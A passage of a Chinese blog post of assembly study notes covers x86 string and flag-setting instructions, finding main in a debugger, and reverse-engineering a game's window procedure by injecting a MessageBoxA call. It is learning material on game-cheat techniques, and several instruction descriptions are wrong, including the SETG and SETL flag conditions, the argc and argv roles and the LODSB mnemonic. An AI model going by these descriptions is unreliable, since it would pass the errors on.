class=\"line\">74D6B903    C1E8 10         shr     eax,0x10</span><br><span class=\"line\">74D6B906    3A41 02         cmp     al,byte ptr ds:[ecx+0x2]</span><br><span class=\"line\">74D6B909    75 19           jnz     short 74D6B924</span><br><span class=\"line\">74D6B90B    0AC0            or      al,al</span><br><span class=\"line\">74D6B90D    74 11           je      short 74D6B920</span><br><span class=\"line\">74D6B90F    3A61 03         cmp     ah,byte ptr ds:[ecx+0x3]</span><br><span class=\"line\">74D6B912    75 10           jnz     short 74D6B924</span><br><span class=\"line\">74D6B914    83C1 04         add     ecx,0x4</span><br><span class=\"line\">74D6B917    83C2 04         add     edx,0x4</span><br><span class=\"line\">74D6B91A    0AE4            or      ah,ah</span><br><span class=\"line\">74D6B91C  ^ 75 D2           jnz     short 74D6B8F0</span><br><span class=\"line\">74D6B91E    8BFF            mov     edi,edi</span><br><span class=\"line\">74D6B920    33C0            xor     eax,eax</span><br><span class=\"line\">74D6B922    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>每次取四个字节依次比较</p>\n<p>SCASB</p>\n<p>SCAS byte ptr es:[EDI]   用于查找 AL 的字符在 edi 中的位置</p>\n<p>相当于</p>\n<p>cmp byte ptr [edi],al</p>\n<p>对标志位的影响相当于 sub 指令，还会修改 edi 的值</p>\n<p>DF=0 ，inc edi</p>\n<p>DF=1,  dec edi</p>\n<p>REPNE</p>\n<p>repne scasb</p>\n<p>ecx !=0 ,zf=0，重复执行后面指令，每执行一次 ecx-1</p>\n<p>REPNE 与 REPNZ 是同一条指令不同助记符</p>\n<p>// 通过 repne 计算字符串长度</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;shabi&quot;);</span><br><span class=\"line\">\tchar *s1 = &quot;123456&quot;;</span><br><span class=\"line\">\t__asm &#123;  //cal length</span><br><span class=\"line\">\t\t\tmov al,0</span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov ecx,-1</span><br><span class=\"line\">\t\t\trepnz scasb</span><br><span class=\"line\">\t\t\tmov eax,-1</span><br><span class=\"line\">\t\t\tsub eax,ecx </span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t__asm &#123;   //find index</span><br><span class=\"line\">\t\t\txor eax,rax</span><br><span class=\"line\">\t\t\tmov al,0x33</span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov ecx,-1</span><br><span class=\"line\">\t\t\trepnz scasb</span><br><span class=\"line\">\t\t\tnot ecx</span><br><span class=\"line\">\t\t\tdec ecx</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tstd::string str1 = s1;</span><br><span class=\"line\">\tint haha = str1.find(&quot;3&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00901000 &gt;/$  55            push    ebp</span><br><span class=\"line\">00901001  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00901003  |.  51            push    ecx</span><br><span class=\"line\">00901004  |.  57            push    edi</span><br><span class=\"line\">00901005  |.  68 F4209000   push    009020F4                               ; /format = &quot;shabi&quot;</span><br><span class=\"line\">0090100A  |.  FF15 A0209000 call    dword ptr ds:[&lt;&amp;MSVCR90.printf&gt;]       ; \\printf</span><br><span class=\"line\">00901010  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00901013  |.  C745 FC FC209&gt;mov     [local.1],009020FC                     ;  ASCII &quot;123456&quot;</span><br><span class=\"line\">0090101A  |.  B0 00         mov     al,0x0</span><br><span class=\"line\">0090101C  |.  8B7D FC       mov     edi,[local.1]</span><br><span class=\"line\">0090101F  |.  B9 FFFFFFFF   mov     ecx,-0x1</span><br><span class=\"line\">00901024  |.  F2:AE         repne   scas byte ptr es:[edi]</span><br><span class=\"line\">00901026  |.  B8 FFFFFFFF   mov     eax,-0x1</span><br><span class=\"line\">0090102B  |.  2BC1          sub     eax,ecx</span><br><span class=\"line\">0090102D  |.  33C0          xor     eax,eax</span><br><span class=\"line\">0090102F  |.  5F            pop     edi</span><br><span class=\"line\">00901030  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00901032  |.  5D            pop     ebp</span><br><span class=\"line\">00901033  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>SCASB  SCASW  SCASD</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221124212255214.png\" alt=\"image-20221124212255214\"></p>\n<p>mov ax,L’7’</p>\n<p>实例运用</p>\n<p>1. 计算字符串长度</p>\n<p>2. 定位特定字符串位置（索引)</p>\n<p>3. 在内存中定位一串特征码</p>\n<p>REPNZ/REPNE 与 SCASB 指令结合使用，表示当串未结束 (ECX!=0)，且当对应串元素不相同 (ZF=0) 时，继续重复执行串比较指令</p>\n<p>REPE/REPZ 和 CMPSB，CMPSW，CMPSD</p>\n<p>1.CMPS</p>\n<p>cmps byte ptr [edi], byte ptr [esi]</p>\n<p>对标志位的影响相当于 sub 指令，同时还会修改 edi 和 esi 的值</p>\n<p>如果 df 为 0，则 edi，esi 按相对大小递增</p>\n<p>df 为 1，递减</p>\n<p>2.REPE、REPZ</p>\n<p>repe/repz cmpsb 当 ecx!=0，zf=1，重复执行后面指令，每执行一次 ecx-1</p>\n<p>用于比较字符串是否相等</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__asm &#123;</span><br><span class=\"line\">\t\txor al,al</span><br><span class=\"line\">\t\tmov edi,s1</span><br><span class=\"line\">\t\tmov ecx,-1</span><br><span class=\"line\">\t\trepnz scasb  //finish position</span><br><span class=\"line\">\t\tnot ecx    //cal length </span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov edi,s1</span><br><span class=\"line\">\t\tmov esi,s2</span><br><span class=\"line\">\t\trepz cmpsb  //compare equal</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\txor al,al</span><br><span class=\"line\">\t\tsete al</span><br><span class=\"line\">\t\tcmp al,1</span><br><span class=\"line\">\t\tjnz result1</span><br><span class=\"line\">\t\tcmp ecx,0</span><br><span class=\"line\">\t\tjz result2</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">result1:</span><br><span class=\"line\">\tprintf(&quot;S1!=S2&quot;);</span><br><span class=\"line\">\tgoto end</span><br><span class=\"line\">result2:</span><br><span class=\"line\">\tprintf(&quot;s1==s2&quot;);</span><br><span class=\"line\">end:</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>汇编编写比较函数</p>\n<p>__declspec (naked)   纯汇编编译函数，不添加寄存器保护和堆栈平衡代码</p>\n<p>窄字节版</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__declspec(naked) int strcmpa(char *s1, char *s2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t\tpush ebp  //esp-4-4</span><br><span class=\"line\">\t\t\tmov ebp,esp   //s1:ebp+4+4   s2:ebp+4+8</span><br><span class=\"line\">\t\t\tpush ecx</span><br><span class=\"line\">\t\t\tpush edi</span><br><span class=\"line\">\t\t\tpush esi</span><br><span class=\"line\">\t\t\tpush edx</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\txor al,al</span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tCLD</span><br><span class=\"line\">\t\t\tmov ecx,-1</span><br><span class=\"line\">\t\t\trepnz scasb  //finish position</span><br><span class=\"line\">\t\t\tnot ecx    //cal length </span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov esi,s2</span><br><span class=\"line\">\t\t\trepz cmpsb  //compare equal</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\txor eax,eax</span><br><span class=\"line\">\t\t\txor edx,edx</span><br><span class=\"line\">\t\t\tmov al,[edi-1]</span><br><span class=\"line\">\t\t\tmov dl,[esi-1]</span><br><span class=\"line\">\t\t\tsub eax,edx</span><br><span class=\"line\">\t\t\tpop edx</span><br><span class=\"line\">\t\t\tpop esi</span><br><span class=\"line\">\t\t\tpop edi</span><br><span class=\"line\">\t\t\tpop ecx </span><br><span class=\"line\">\t\t\tpop ebp</span><br><span class=\"line\">\t\t\tretn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>宽字节版</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__declspec(naked) int strcmpW(wchar_t *s1, wchar_t *s2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\t\tpush ebp  //esp-4-4</span><br><span class=\"line\">\t\t\tmov ebp,esp   //s1:ebp+4+4   s2:ebp+4+8</span><br><span class=\"line\">\t\t\tpush ecx</span><br><span class=\"line\">\t\t\tpush edi</span><br><span class=\"line\">\t\t\tpush esi</span><br><span class=\"line\">\t\t\tpush edx</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\txor ax,ax</span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov ecx,-1</span><br><span class=\"line\">\t\t\tCLD</span><br><span class=\"line\">\t\t\trepnz scasw  //finish position</span><br><span class=\"line\">\t\t\tnot ecx      //cal length </span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tmov edi,s1</span><br><span class=\"line\">\t\t\tmov esi,s2</span><br><span class=\"line\">\t\t\trepz cmpsw   //compare equal</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\txor eax,eax</span><br><span class=\"line\">\t\t\txor edx,edx</span><br><span class=\"line\">\t\t\tmov al,[edi-2]</span><br><span class=\"line\">\t\t\tmov dl,[esi-2]</span><br><span class=\"line\">\t\t\tsub eax,edx</span><br><span class=\"line\">\t\t\tpop edx</span><br><span class=\"line\">\t\t\tpop esi</span><br><span class=\"line\">\t\t\tpop edi</span><br><span class=\"line\">\t\t\tpop ecx </span><br><span class=\"line\">\t\t\tpop ebp</span><br><span class=\"line\">\t\t\tretn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ESP+4 是 call 的下一个命令的地址</p>\n<p>ESP+8 是外部传进来的第一个变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126203249743.png\" alt=\"image-20221126203249743\"></p>\n<p>STD/CLD</p>\n<p>修改 DF</p>\n<p>STD DF=1</p>\n<p>CLD DF=0</p>\n<p>串存储和加载指令</p>\n<p>1. 串存储指令 STOSB STOSW  STOSD</p>\n<p>stos btye ptr [edi]</p>\n<p>相当于 mov byte ptr [edi],al</p>\n<p>rep stosb     //rep stos byte ptr [edi]</p>\n<p>用 al 的值填充 byte ptr [edi]，每次 ecx-1，edi+1</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a[0x22];</span><br><span class=\"line\">\ta[0] = 1;</span><br><span class=\"line\">\ta[0x12] = 222;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">013F13A0    55              push    ebp</span><br><span class=\"line\">013F13A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">013F13A3    81EC 50010000   sub     esp,0x150</span><br><span class=\"line\">013F13A9    53              push    ebx</span><br><span class=\"line\">013F13AA    56              push    esi</span><br><span class=\"line\">013F13AB    57              push    edi</span><br><span class=\"line\">013F13AC    8DBD B0FEFFFF   lea     edi,dword ptr ss:[ebp-0x150]</span><br><span class=\"line\">013F13B2    B9 54000000     mov     ecx,0x54</span><br><span class=\"line\">013F13B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">013F13BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">013F13BE    C785 74FFFFFF 0&gt;mov     dword ptr ss:[ebp-0x8C],0x1</span><br><span class=\"line\">013F13C8    C745 BC DE00000&gt;mov     dword ptr ss:[ebp-0x44],0xDE</span><br><span class=\"line\">013F13CF    33C0            xor     eax,eax</span><br><span class=\"line\">013F13D1    52              push    edx</span><br><span class=\"line\">013F13D2    8BCD            mov     ecx,ebp</span><br><span class=\"line\">013F13D4    50              push    eax</span><br><span class=\"line\">013F13D5    8D15 EC133F01   lea     edx,dword ptr ds:[0x13F13EC]</span><br><span class=\"line\">013F13DB    E8 A7FCFFFF     call    013F1087</span><br></pre></td></tr></table></figure>\n<p>手动初始化数组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__asm &#123;</span><br><span class=\"line\">\tmov ecx,0x22</span><br><span class=\"line\">\txor eax,eax</span><br><span class=\"line\">\tlea edi,a</span><br><span class=\"line\">\trep stosd</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>debug 找 main 函数</p>\n<p>退出函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">013F199F    FF15 7C823F01   call    dword ptr ds:[&lt;&amp;MSVCR90D.exit&gt;]                      ; msvcr90d.exit</span><br></pre></td></tr></table></figure>\n<p>退出函数的上一个函数即使 main 函数</p>\n<p>release 中程序中断位置不在 main 上，在 jmp 上才时 main</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126213639997.png\" alt=\"image-20221126213639997\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126213710284.png\" alt=\"image-20221126213710284\"></p>\n<p>看 exit 找 main 或者看 main 的 argv ，argc 参数找 main 也可以</p>\n<p>这边没删 pdb，删了一样</p>\n<p>同时注意，main 有三个参数，argv 参数个数，argc 参数数组，envp 环境变量</p>\n<p>envp 是二级指针，需要两次寻址，存放系统环境变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127190321276.png\" alt=\"image-20221127190321276\"></p>\n<p>argv 也是二级指针，存在文件路径</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127190413354.png\" alt=\"image-20221127190413354\"></p>\n<p>argc 存放 argv 中参数个数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127190503930.png\" alt=\"image-20221127190503930\"></p>\n<p>串载入指令</p>\n<blockquote>\n<p>loadSB ,LOADSW,LOASSD</p>\n<p>相当于 mov al,byte ptr [esi] 将内存中数据放到寄存器中</p>\n<p>rep loadsb</p>\n<p>rep loads word ptr [esi]</p>\n<p>用 byte ptr [esi] 填充 al，每次 ecx-1，esi+1</p>\n</blockquote>\n<p>循环控制指令</p>\n<blockquote>\n<p>loop start</p>\n<p>1.ecx-1</p>\n<p>2.ecx！=0 转移到标号处循环执行</p>\n<p>3. 直至 ecx=0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i = 100;</span><br><span class=\"line\">\tchar *s = &quot;%d&quot;;</span><br><span class=\"line\">\t__asm mov ecx,i</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">start:</span><br><span class=\"line\">\t\tpush ecx</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpush ecx</span><br><span class=\"line\">\t\tmov eax,s</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tcall dword ptr [printf]</span><br><span class=\"line\">\t\tadd esp,8</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpop ecx</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tloop start</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>条件置位指令</p>\n<blockquote>\n<p>sete  setz</p>\n<p>sete al  取 zf 标志位的值</p>\n<p>setnz 、 setne</p>\n<p>将 zf 的值取反保存</p>\n<p>setg al</p>\n<p>大于比较时 ZF =0&amp;&amp; sf=0 &amp;&amp; OF=1 时 al=1</p>\n<p>setl al</p>\n<p>小于比较</p>\n<p>sf=1 || of=1 ，al=1</p>\n<p>setge</p>\n<p>操作数可以是一个字节存储单元，可以是一个字节宽度寄存器</p>\n<p>&gt;= 时，操作数值 1，否则为 0，一般与 cmp 结合使用</p>\n<p>SF=OF ，操作数置 1</p>\n<p>setle</p>\n<p>操作数可以是一个字节存储单元，可以是一个字节宽度寄存器</p>\n<p>&lt;= 时，操作数值 1，否则为 0，一般与 cmp 结合使用</p>\n<p>ZF = 1 || sf!= of 操作数置 1</p>\n</blockquote>\n<h2 id=\"实战\"><a class=\"markdownIt-Anchor\" href=\"#实战\">#</a> 实战</h2>\n<h3 id=\"1游戏call\"><a class=\"markdownIt-Anchor\" href=\"#1游戏call\">#</a> 1. 游戏 call</h3>\n<blockquote>\n<p>调用 MessageBoxA 函数 call</p>\n<p>1. 找到 messageboxA call 地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">76C4FD1E &gt;  8BFF            mov     edi,edi</span><br></pre></td></tr></table></figure>\n<p>2. 找到 MessageBoxA call 参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int MessageBox(</span><br><span class=\"line\">[in, optional] HWND    hWnd,</span><br><span class=\"line\">[in, optional] LPCTSTR lpText,</span><br><span class=\"line\">[in, optional] LPCTSTR lpCaption,</span><br><span class=\"line\">[in]           UINT    uType</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">我们用四个push 0，因为都可以传0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br></pre></td></tr></table></figure>\n<p>3. 注入代码测试调用 MessageBoxA call</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127205600961.png\" alt=\"image-20221127205600961\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127205625663.png\" alt=\"image-20221127205625663\"></p>\n<p>或者在第二个和第三个参数传入字符指针，，第一个参数改变窗口格式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push 0</span><br><span class=\"line\">push 01005148</span><br><span class=\"line\">push 01005148</span><br><span class=\"line\">push 0</span><br><span class=\"line\">call 76C4FD1E</span><br></pre></td></tr></table></figure>\n<p>2. 窗口菜单类 call 分析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127212738634.png\" alt=\"image-20221127212738634\"></p>\n<p>follow poc，定位窗口处理函数位置</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127214017807.png\" alt=\"image-20221127214017807\"></p>\n<p>窗口处理函数原型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LRESULT CALLBACK WindowProc(</span><br><span class=\"line\">HWND hwnd, </span><br><span class=\"line\">UINT uMsg, </span><br><span class=\"line\">WPARAM wParam, </span><br><span class=\"line\">LPARAM lParam </span><br><span class=\"line\">); </span><br></pre></td></tr></table></figure>\n<p>菜单被点击的时候发送的是 WM_COMMAND 消息</p>\n<p>当点击菜单的时候，WindowProc 会被系统调用，</p>\n<p>uMsg = WM_COMMAND</p>\n<p>wPARAM = 窗口菜单的 id</p>\n<p>在 WindowProc 函数下条件断点</p>\n<p>条件时：uMSG == WM_COMMAND</p>\n<p>如  edx == WM_COMMAND 条件断点</p>\n<p>点击菜单时条件断点被中断</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221128192802977.png\" alt=\"image-20221128192802977\"></p>\n<p>点击初级时 edx == VMCOMMAND == 0x111</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01001BC9  /.  55            push    ebp</span><br><span class=\"line\">01001BCA  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">01001BCC  |.  83EC 40       sub     esp,0x40</span><br><span class=\"line\">01001BCF  |.  8B55 0C       mov     edx,[arg.2]   ; uMsg</span><br><span class=\"line\">01001BD2 &gt;|.  8B4D 14       mov     ecx,[arg.4]   ; edx == WM_COMMAND</span><br><span class=\"line\">01001BD5  |.  53            push    ebx</span><br><span class=\"line\">01001BD6  |.  56            push    esi</span><br><span class=\"line\">01001BD7  |.  33DB          xor     ebx,ebx</span><br><span class=\"line\">01001BD9  |.  57            push    edi</span><br></pre></td></tr></table></figure>\n<p>分析出各项菜单被点击时四个参数的值</p>\n<p>wParam（菜单 ID）参数：</p>\n<p>​\t初级菜单 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EBP+8    &gt;|0011029C   HWND hwnd</span><br><span class=\"line\">EBP+C    &gt;|00000111   uMsg</span><br><span class=\"line\">EBP+10   &gt;|00000209   wParam</span><br><span class=\"line\">EBP+14   &gt;|00000000   lParam</span><br></pre></td></tr></table></figure>\n<p>​\t中级菜单 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 